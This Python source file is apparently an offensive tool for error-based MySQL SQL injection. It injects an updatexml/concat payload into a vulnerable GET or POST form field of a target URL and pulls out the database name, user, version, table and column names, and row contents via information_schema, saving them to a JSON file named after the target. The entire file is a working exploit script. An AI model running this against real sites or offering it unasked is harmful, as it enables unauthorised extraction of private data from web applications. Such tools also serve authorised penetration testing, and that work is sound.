#!/usr/bin/python
# 
# Enumerate details of a MySQL database through a form field that is vulnerable to SQL injection 
# Copyright (C) 2019
# Salman Raza <raza.salman@gmail.com>
#
# GNU General Public License v3.0
#
# This program is free software: you can redistribute it and/or modify it under the terms
# of the GNU General Public License as published by the Free Software Foundation, either version 3
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
# even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General
# Public License for more details.
#
# You should have received a copy of the GNU General Public License along with this program.
# If not, see <https://www.gnu.org/licenses/>



import requests
import datetime
from Tools.ScreenColors import clr
from Tools.LoggerLib import *
from tqdm import trange, tqdm
import jsonstreams

enum_logger = colorlog.getLogger('MYSQLENUM')


class MYSQLENUM():
    
    def __init__(self, target_url, data, vuln_field, table_limit, debug, request_type, terminator="';#"):

        self.target_url = target_url
        self.data = data
        self.vuln_field = vuln_field
        
        self.table_limit = ""
        
        self.debug = debug
        
        self.debug_levels = {'d':logging.DEBUG,
                            'w':logging.WARNING,
                            'i':logging.INFO,
                            'e':logging.ERROR,
                            'c':logging.CRITICAL}
        
        self.set_debug_level()
        
        self.terminator = terminator
        
        self.request_type = request_type
        
        
        
        if table_limit:
            
            self.table_limit = " limit " + table_limit
        
        self.sqli = "1' and updatexml(1, concat(0x7e, (~payload~)), 0) and '1" + self.terminator
        
        self.payload_delimiter = "~payload~"
        
        self.enum_tables_pl = "select table_name from information_schema.tables where table_schema in (database())"
        
        self.enum_cols_pl = "select column_name from information_schema.columns where table_name='{table_name}' and table_schema in (database())"
        
        self.enum_rows_pl = "select {col_name} from {table_name}"
        
        self.count_pl = "select count(*) from ({count}) as countings"
        
        self.num_tables_pl = self.count_pl.format(count=self.enum_tables_pl+self.table_limit)
        
        self.num_cols_pl = self.count_pl.format(count=self.enum_cols_pl)
        
        self.num_rows_pl = self.count_pl.format(count=self.enum_rows_pl)
        
        self.limits = " limit ~num~,1"
        
        self.info = {"dbname" : "select database()", 
                    "username" : "select user()",
                    "version" : "select @@version",
                    "table_count" : self.num_tables_pl}
        
        self.DB = {}


    def get_params(self):
        
        params = {}
        
        params['url'] = self.target_url
        params['data'] = self.data
        params['request_type'] = self.request_type
        params['vuln_field'] = self.vuln_field
        params['limit'] = self.table_limit
        params['terminator'] = self.terminator
        params['debug'] = self.debug
        
        return params
        

    def get_fd(self):
        '''Get a file descripter to write the json output. The website name or the IP address of the target will be used in the filename.'''
        
        file = self.target_url.split('/')[2]
        
        return open ('./{}.json'.format(file), 'w')

    def set_debug_level(self):
        '''Set the verbosity level of the debug messages'''
        
        if self.debug is not None:
            
            enum_logger.disabled = False
            
            enum_logger.setLevel(self.debug_levels[self.debug])
                
        else:
            
            enum_logger.disabled = True
        

    def get_info(self):
        '''Retrieve basic information from the database including database name, current user, number of tables and database version'''
        
        print(clr.yellow("Enumerating DB Info"))
        
        info_dict = {}
        
        prog_bar = tqdm(self.info.items())
        
        for info,query in prog_bar:
            
            enum_logger.info("Retreiving {}".format(info))
            
            self.construct_vuln_field(self.info[info])
            
            prog_bar.set_description("Retreiving '{}'".format(clr.red(info)))
            
            info_dict[info] = self.send_sqli()

        
        return info_dict
            
    
    def enumerate(self):
        '''Construct a dictionary with the various data enumerated from the target'''
        
        self.DB['date'] = str(datetime.datetime.now())
        
        self.DB['params'] = self.get_params()
        
        self.DB['info'] = self.get_info()
            
        self.DB['tables'] = self.enumerate_tables()
        
    def get_num_cols(self,table):
        '''Retrieve the number of columns in a table'''
    
        self.construct_vuln_field(self.num_cols_pl.format(table_name=table))
        
        enum_logger.info("Querying no. of columns for : {}".format(table))
        
        num_cols = self.send_sqli()
        
        return num_cols
 
    def get_num_rows(self,table):
        '''Retrieve the number of rows in a table'''
    
        self.construct_vuln_field(self.num_rows_pl.format(table_name=table,col_name="*"))
        
        enum_logger.info("Querying no. of rows for : {}".format(table))
        
        num_rows = self.send_sqli()
        
        return num_rows
 
    def construct_vuln_field(self, payload):
        '''Prepare the POST or GET data that will be sent as a part of the injected SQL'''
        
        self.data[self.vuln_field] = self.sqli.replace(self.payload_delimiter,payload)
    
    def enumerate_tables(self):
        '''Start enumerating various details including table names, number of columns and rows, and column names'''
        
        enum_logger.info("Enumerating table names")
        
        total_tables = self.DB['info']['table_count']
        
        if not self.debug:
            
            print(clr.yellow("\n'{}' tables found, Enumerating columns ...\n".format(clr.red(total_tables))))
            
        prog_bar = trange(int(total_tables))
        
        table_dict = {}
        
        with jsonstreams.Stream(jsonstreams.Type.object, fd=self.get_fd(), pretty=True, indent=4) as s:
            '''Using jsonstreams to write the enumerated information to a json file as it is retreived from the target_url through SQL injection. This is done so that in the event of a crash or connection reset/timeout, whatever was retreived is not lost.'''
            
            s.write('date',self.DB['date'])
            s.write('params', self.DB['params'])
            s.write('info',self.DB['info'])
            
            with s.subobject('tables') as t:
            
                for i in prog_bar:
                
                    live_enum_pl = self.sqli.replace(self.payload_delimiter,self.enum_tables_pl+self.limits.replace("~num~",str(i)))
                    
                    self.data[self.vuln_field] = live_enum_pl
                    
                    table = self.send_sqli()
                    
                    prog_bar.set_description("Table '{}': '{}'".format(clr.red(str(i+1)),clr.red(table)))
                    
                    enum_logger.info("Enumerating table '{}': '{}'".format(i+1,table))
                    
                    table_dict[table] = {}
                    
                    table_dict[table]['row_count'] = self.get_num_rows(table)
                    
                    table_dict[table]['col_count'] = self.get_num_cols(table)
                    
                    table_dict[table]['cols'] = self.get_cols(table_dict[table]['col_count'], table)
                    
                    
                    
                    t.write(table,table_dict[table])
            
        return table_dict
            
        
            
    def get_cols(self, col_count, table):
        '''Retrieve the list of columns names in a table'''

        cols_list = {}
        
        enum_logger.info("Enumerated column: '{}' ... ".format(table))
        
        prog_bar = trange(int(col_count))
        
        for i in prog_bar:
            
            live_enum_pl = self.sqli.replace(self.payload_delimiter,self.enum_cols_pl.format(table_name=table)+self.limits.replace("~num~",str(i)))
            
            self.data[self.vuln_field] = live_enum_pl

            col = self.send_sqli()
            
            prog_bar.set_description("Column: '{}'".format(clr.red(col)))

            cols_list[col] = None
            
        return cols_list

    def get_rows(self, col_name, table_name, limit=None):
        '''Retrieve the list of rows for a particular column in a table'''
        
        row_list = []
        
        enum_logger.info("Enumerating rows for table: '{}', column: '{}' ... ".format(table_name, col_name))

        if limit:

            prog_bar = trange(limit)
            
        else:
            
            prog_bar = trange(int(self.DB['tables'][table_name]['row_count']))
            
        
        for i in prog_bar:
            
            live_enum_pl = self.sqli.replace(self.payload_delimiter,self.enum_rows_pl.format(table_name=table_name, col_name=col_name)+self.limits.replace("~num~",str(i)))
            
            self.data[self.vuln_field] = live_enum_pl

            row = self.send_sqli()
            
            prog_bar.set_description("Enumerated row data: '{}'".format(clr.red(row)))
            
            row_list.append(row)
            
        return row_list

    def generate_rows(self, col_name, table_name, limit=None):
        '''A generator for enumerating rows for a particular column in a table'''
        
        row_list = []
        
        if limit:

            prog_bar = trange(limit)
            
        else:
            
            prog_bar = trange(int(self.DB['tables'][table_name]['row_count']))
            
        
        for i in prog_bar:
            
            live_enum_pl = self.sqli.replace(self.payload_delimiter,self.enum_rows_pl.format(table_name=table_name, col_name=col_name)+self.limits.replace("~num~",str(i)))
            
            self.data[self.vuln_field] = live_enum_pl

            row = self.send_sqli()
            
            prog_bar.set_description("Enumerated row data: '{}'".format(clr.red(row)))
            
            row_list.append(row)
            
            yield row
                         
    def send_sqli(self):
        '''Send the SQL query+payload to be executed on the target via SQL injection'''
        
        response = ""
    
        try:
    
            if self.request_type == "post":
            
                enum_logger.debug("Sending POST: {}".format(self.data))
                
                response = requests.post(self.target_url,data=self.data).text
                
                enum_logger.debug("POST reply: {}".format(response))
   
            if self.request_type == "get":
                
                enum_logger.debug("Sending GET: {}".format(self.data))
                
                response = requests.get(self.target_url,params=self.data).text
                
                enum_logger.debug("GET reply: {}".format(response))
                
            
            
            retval = response.split('~')[1].split("'")[0]
            
            self.data[self.vuln_field] = ""
            
            return retval
            
        except Exception as e:
            
            print("\n\nUnexpected response received from host:\nError: {}\nURL: {}\nData sent: {}\nResponse received: {}".format(e,self.target_url,self.data, response))
        
            exit(0)
        
